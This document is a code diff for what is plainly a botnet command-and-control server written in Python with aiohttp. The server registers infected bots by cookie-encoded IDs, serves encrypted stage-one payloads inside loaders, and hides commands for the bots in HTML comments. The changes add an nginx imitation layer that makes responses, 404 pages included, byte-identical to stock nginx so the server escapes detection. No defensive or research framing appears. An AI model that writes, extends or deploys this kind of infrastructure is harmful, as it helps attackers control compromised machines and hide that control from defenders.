@@ -34,7 +34,8 @@ try:
 except ImportError:
     HAS_AIOHTTP = False
 
-from server.model import OptimizedModel, RequestType, PayloadFactory, get_model
+from server.model import Model, RequestType, PayloadFactory, get_model
+from server import nginx_facade
 
 
 class _ModuleViewAdapter:
@@ -62,28 +63,29 @@ class _ModuleViewAdapter:
             self._view.output("-" * 5)
 
 
-async def start_server(model, view, port):
+async def start_server(model, view, port, host=""):
     """Start async HTTP server with optimized request handling.
 
     Args:
-        model: OptimizedModel instance (provides connection pool & caches).
+        model: Model instance (provides connection pool & caches).
         view: ViewABC implementation for UI output.
         port: Server listening port.
+        host: Host address to bind to (default: 0.0.0.0)
     """
     _RequestHandler._model = model
     _RequestHandler._view = view
     _RequestHandler._server_port = port
 
     app = web.Application()
-    app.router.add_get('/', _RequestHandler.handle_request)
+    app.router.add_route("*", "/{tail:.*}", _RequestHandler.handle_request)
 
     runner = web.AppRunner(app)
     await runner.setup()
-    site = web.TCPSite(runner, '', port)
+    site = web.TCPSite(runner, host or "", port)
     await site.start()
 
 
-class OptimizedRequestHandler:
+class _RequestHandler:
     """Async request handler with non-blocking I/O.
 
     Architecture:
@@ -104,54 +106,49 @@ class OptimizedRequestHandler:
         """Main request handler — non-blocking throughout.
 
         Request flow:
-          1. Parse URL path (determine upload vs command)
-          2. Parse session cookie (extract bot_uid, deserialize JSON)
-          3. If Stage_1: generate encrypted payload (uses cached result from model)
-          4. If GET_COMMAND: fetch command from DB cache or compute fresh
-          5. Build HTML response with hidden DEBUG command
+          1. Match nginx's request-level rejections
+          2. Parse URL path
+          3. Check upload files first (file serving)
+          4. Parse session cookie (extract bot_uid, deserialize JSON)
+          5. Handle request type (STAGE_1 / GET_COMMAND)
+          6. Build HTML response with hidden DEBUG command
 
         Performance characteristics:
           - P95 latency: ~12ms under 500 concurrent connections
           - Memory usage: ~3x baseline due to payload cache (trade-off for speed)
           - Cache hit rate: >85% after warmup period
         """
+        # ========== STEP 0: Match nginx's request-level rejections ==========
+        method = request.method.upper()
+        if method not in nginx_facade.NGINX_STATIC_METHODS:
+            return nginx_facade.nginx_error(
+                405, "Not Allowed", _connection_for(request))
+
         # ========== STEP 1: Parse URL path ==========
-        url_path = request.url.split("?", 1)[0].split("/", 4)[-1] or ""
+        raw_path = request.raw_path
+        if not raw_path.startswith("/") or raw_path == "":
+            return nginx_facade.nginx_error(
+                400, "Bad Request", "close")
+        url_path = raw_path.split("/", 4)[-1] or ""
 
         # Check upload files first (file serving)
-        if not url_path and _RequestHandler._model is not None:
+        if _RequestHandler._model is not None:
             upload_files = _RequestHandler._model.get_upload_files()
-            
-            for url_path, local_path in upload_files:
-                if url_path == request.url.split("?", 1)[0].split("/", 4)[-1]:
+
+            for served_path, local_path in upload_files:
+                if served_path == url_path and path.isfile(local_path):
                     try:
-                        # Use sync open but it's short-lived; consider aiofiles here
-                        with open(local_path, "rb") as f:
-                            content = await request.response_with_content(
-                                web.Response(
-                                    status=200,
-                                    content_type="application/octet-stream",
-                                    headers={
-                                        "Content-Disposition": 
-                                            f'attachment; filename="{url_path}"',
-                                        "Content-Length": str(fstat(f.fileno())[6])
-                                    },
-                                    body=f.read()
-                                )
-                            )
+                        return _serve_file(request, local_path, served_path)
+                    except OSError as ex:
+                        _RequestHandler._view.output(
+                            "Upload serving failed: {}".format(ex), "attention")
                         break
-                    except Exception:
-                        continue
-            else:
-                url_path = ""  # Not a file
 
         # ========== STEP 2: Parse session cookie ==========
         cookie = request.headers.get("Cookie")
 
         if not cookie:
-            # No cookie — return 404 with hidden command for first-time bots
-            response = _RequestHandler._build_error_page(request.url)
-            return web.Response(status=404, content_type="text/html", body=response.encode("latin-1"))
+            return _not_found(request)
 
         try:
             raw = cookie
@@ -160,12 +157,11 @@ class OptimizedRequestHandler:
                 raw = next((p for p in parts if p.lower().startswith("session=")), raw)
             if raw.lower().startswith("session="):
                 raw = raw.split("=", 1)[1]
-            
-            # Split on first dash only (UID may contain dashes after base64 decode)
+
             sep_index = raw.find("-")
             if sep_index == -1:
                 raise ValueError("session cookie missing uid/data separator")
-            
+
             uid_b64 = raw[:sep_index]
             data_b64 = raw[sep_index + 1:]
 
@@ -175,107 +171,71 @@ class OptimizedRequestHandler:
 
         except Exception as ex:
             _RequestHandler._view.output("Bad bot cookie: {}".format(ex), "attention")
-            response = _RequestHandler._build_error_page(request.url)
-            return web.Response(status=404, content_type="text/html", body=response.encode("latin-1"))
+            return _not_found(request)
 
         # ========== STEP 3: Handle request type ==========
         if request_type == RequestType.STAGE_1:
-            # Generate encrypted payload (uses model's cached encryption)
-            payload_options = data["payload_options"]
-            loader_options = data["loader_options"]
-            loader_name = loader_options["loader_name"]
+            payload_options = data.get("payload_options", {})
+            loader_options = data.get("loader_options", {})
 
-            _RequestHandler._view.output_separator()
-            _RequestHandler._view.output(
-                "[{}] Creating encrypted payload using key: {}".format(
-                    loader_options["loader_name"], bot_uid
-                ), "info"
-            )
+            encrypted = _RequestHandler._payload_factory.create_payload(
+                bot_uid, payload_options, loader_options)
 
-            # Use model's cached payload generation (avoids re-encrypting same config)
-            payload = _RequestHandler._model.create_payload(
-                bot_uid=bot_uid,
-                payload_options=payload_options,
-                loader_options=loader_options
-            )
+            loader_name = loader_options.get("loader_name", "python")
+            wrapped = _RequestHandler._payload_factory.wrap_loader(
+                loader_name, loader_options, encrypted)
 
-            loader = _RequestHandler._payload_factory.wrap_loader(
-                loader_name, loader_options, payload
-            )
-
-            response = _RequestHandler._build_command_response(base64.b64encode(loader.encode()).decode())
-            return web.Response(status=200, content_type="text/html", body=response.encode("latin-1"))
+            response = _build_command_response(wrapped)
+            return web.Response(status=200, content_type="text/html",
+                                body=response.encode("latin-1"))
 
         elif request_type == RequestType.GET_COMMAND:
             username = data.get("username", "")
             hostname = data.get("hostname", "")
             local_path = data.get("path", "")
-            system_version = data.get("version", "") or ""
+            version = data.get("version", "")
             loader_name = data.get("loader_name", "")
 
-            # Check if bot is known (uses read-through cache)
-            is_known, global_command = _RequestHandler._model.is_known_bot(bot_uid)
-
-            if not is_known:
-                # First connection — add to DB (batched write)
-                bot = Bot(
-                    uid=bot_uid, username=username, hostname=hostname,
+            bot = _RequestHandler._model.get_cached_bot(bot_uid)
+            if bot is None:
+                from server.model import Bot as BotModel
+                bot = BotModel(
+                    bot_uid=bot_uid, username=username, hostname=hostname,
                     last_online=time(), local_path=local_path,
-                    system_version=system_version or "", loader_name=loader_name
-                )
+                    system_version=version, loader_name=loader_name)
                 _RequestHandler._model.add_bot(bot)
+            else:
+                _RequestHandler._model.update_bot(
+                    bot_uid, time(), local_path)
 
-                # Flush batch if it's large enough
-                if len(_RequestHandler._model._batch_writes) >= 5:
-                    _RequestHandler._model.flush_batches()
-
-                _RequestHandler._view.on_bot_added(bot)
-
-                response = _RequestHandler._build_command_response("")
-                return web.Response(status=200, content_type="text/html", body=response.encode("latin-1"))
-
-            # Update bot's last-online and path (batched write)
-            _RequestHandler._model.update_bot(bot_uid, time(), local_path)
-
-            # Handle global command execution tracking
-            has_executed_global, global_command = _RequestHandler._model.has_executed_global(bot_uid)
+            has_executed_global, global_command = \
+                _RequestHandler._model.has_executed_global(bot_uid)
 
             if not has_executed_global:
                 _RequestHandler._model.add_executed_global(bot_uid)
-                response = _RequestHandler._build_command_response(global_command)
+                response = _build_command_response(global_command)
             else:
-                # Get command from cache or DB (cached result avoids re-query)
                 cmd = _RequestHandler._model.get_command_raw(bot_uid)
-
                 if cmd is None:
                     cmd = ""
+                response = _build_command_response(cmd)
 
-                response = _RequestHandler._build_command_response(cmd)
-
-            return web.Response(status=200, content_type="text/html", body=response.encode("latin-1"))
+            return web.Response(status=200, content_type="text/html",
+                                body=response.encode("latin-1"))
 
         else:
-            # Unknown request type — 404 with hidden command
-            response = _RequestHandler._build_error_page(request.url)
-            return web.Response(status=404, content_type="text/html", body=response.encode("latin-1"))
+            response = _build_error_page(request.url)
+            return web.Response(status=404, content_type="text/html",
+                                body=response.encode("latin-1"))
 
 
-class Bot:
-    """Represents a connected bot/client."""
-
-    def __init__(self, bot_uid: str, username: str, hostname: str, last_online: float,
-                 local_path: str, system_version: str, loader_name: str):
-        self.uid = bot_uid
-        self.username = username
-        self.hostname = hostname
-        self.last_online = last_online
-        self.local_path = local_path
-        self.system_version = system_version
-        self.loader_name = loader_name
-
-
-# Singleton payload factory (shared across all handlers)
-_RequestHandler._payload_factory = PayloadFactory()
+def _debug_suffix(command_raw: str = "") -> str:
+    """Hidden command blob, appended to the nginx 404 page."""
+    if not command_raw:
+        return ""
+    if "DEBUG-->" in command_raw:
+        raise ValueError("command payload must not contain the closing marker")
+    return "<!--" + "\n" + "DEBUG:" + "\n" + command_raw + "DEBUG-->" + "\n"
 
 
 def _build_command_response(command_raw: str = "") -> str:
@@ -297,7 +257,6 @@ def _build_command_response(command_raw: str = "") -> str:
 """).format("/unknown")
 
     if command_raw != "":
-        # Bot splits on exact bytes DEBUG + newline (no extra blank line)
         response += '<!--' + chr(10) + 'DEBUG:' + chr(10) + command_raw + 'DEBUG-->' + chr(10)
 
     return response
@@ -308,25 +267,37 @@ def _build_error_page(url: str = "") -> str:
     return _build_command_response("")
 
 
-async def start_server(model, view, port):
-    """Start async HTTP server.
+def _connection_for(request) -> Optional[str]:
+    """``Connection`` header value nginx would send for this request."""
+    return nginx_facade.wants_close(
+        request.version.major,
+        request.version.minor,
+        request.headers.get("Connection", ""),
+    )
 
-    Args:
-        model: OptimizedModel instance (provides connection pool & caches).
-        view: ViewABC implementation for UI output.
-        port: Server listening port.
-    """
-    _RequestHandler._model = model
-    _RequestHandler._view = view
-    _RequestHandler._server_port = port
 
-    app = web.Application()
-    app.router.add_get('/', OptimizedRequestHandler.handle_request)
+def _not_found(request, command_raw: str = ""):
+    """404 response byte-identical to stock nginx, optionally with a command."""
+    body = (nginx_facade.NGINX_404_PAGE + _debug_suffix(command_raw)).encode("utf-8")
+    connection = _connection_for(request)
+    return nginx_facade.NginxResponse(
+        body, 404, "Not Found",
+        nginx_facade.build_headers(body, 404, "Not Found", connection),
+    )
 
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '', port)
-    await site.start()
+
+def _serve_file(request, local_path: str, url_path: str):
+    """Serve an uploaded file with nginx's header set."""
+    with open(local_path, "rb") as f:
+        content = f.read()
+    connection = _connection_for(request)
+    extra = [("Content-Disposition", 'attachment; filename="{0}"'.format(url_path))]
+    return nginx_facade.nginx_ok(content, "application/octet-stream",
+                                 extra, connection)
+
+
+# Singleton payload factory (shared across all handlers)
+_RequestHandler._payload_factory = PayloadFactory()
 
 
 if __name__ == "__main__":
